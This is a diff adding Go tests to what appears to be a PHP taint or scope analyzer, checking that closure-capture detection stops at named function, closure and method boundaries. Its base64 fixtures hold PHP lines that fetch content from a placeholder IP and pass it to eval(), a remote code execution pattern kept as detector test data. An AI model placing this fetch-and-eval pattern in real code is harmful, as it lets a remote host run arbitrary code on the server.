@@ -1052,3 +1052,65 @@ func TestCaptureDoesNotCrossNonCapturingBindings(t *testing.T) {
 		})
 	}
 }
+
+var (
+	// Each of these declares a top-level arrow function so that the top-level
+	// scope is one a capture could be resolved against at all; without it the
+	// walk never reaches the top level and the case would pass for the wrong
+	// reason. The sink then sits inside a NAMED function, closure, or method,
+	// none of which receives the outer $payload -- only an arrow function
+	// forwards enclosing bindings implicitly.
+	fxBoundaryNamedFunction = b64(`<?php
+$payload = file_get_contents('http://198.51.100.7/x');
+$probe = fn() => $unrelated;
+function h() { return fn() => eval($payload); }`)
+
+	fxBoundaryClosure = b64(`<?php
+$payload = file_get_contents('http://198.51.100.7/x');
+$probe = fn() => $unrelated;
+$h = function() { return fn() => eval($payload); };`)
+
+	fxBoundaryMethod = b64(`<?php
+$payload = file_get_contents('http://198.51.100.7/x');
+$probe = fn() => $unrelated;
+class K { function m() { return fn() => eval($payload); } }`)
+
+	fxBoundaryRealCapture = b64(`<?php
+$payload = file_get_contents('http://198.51.100.7/x');
+$probe = fn() => $unrelated;
+$h = fn() => eval($payload);`)
+)
+
+// TestCaptureStopsAtNonArrowScopeBoundary pins the reset that separates one
+// lexical scope's bindings from another's during capture analysis. An arrow
+// function forwards its enclosing bindings, so the walk deliberately carries
+// them across arrow boundaries; a named function, an ordinary closure, and a
+// method do not, and must start clean. Without the reset, a variable named in
+// any of those bodies matches an identically named tainted variable from an
+// unrelated outer scope and raises a marker on code that captured nothing --
+// the same name-collision class the package's scope isolation exists to stop.
+func TestCaptureStopsAtNonArrowScopeBoundary(t *testing.T) {
+	for _, tc := range []struct{ name, fixture string }{
+		{"named function", fxBoundaryNamedFunction},
+		{"closure", fxBoundaryClosure},
+		{"method", fxBoundaryMethod},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			rep := run(t, tc.fixture)
+			if rep.Status != StatusAnalyzed {
+				t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
+			}
+			if slices.Contains(rep.PrecisionLoss, "closure-capture") {
+				t.Fatalf("precision loss = %v, want no closure-capture: %s bodies do not receive an outer binding", rep.PrecisionLoss, tc.name)
+			}
+		})
+	}
+
+	// The positive control differs from the three above only in which scope
+	// holds the sink, so a fix that silenced the marker everywhere would fail
+	// here rather than look like a pass.
+	rep := run(t, fxBoundaryRealCapture)
+	if !slices.Contains(rep.PrecisionLoss, "closure-capture") {
+		t.Fatalf("precision loss = %v, want closure-capture for a real arrow capture", rep.PrecisionLoss)
+	}
+}
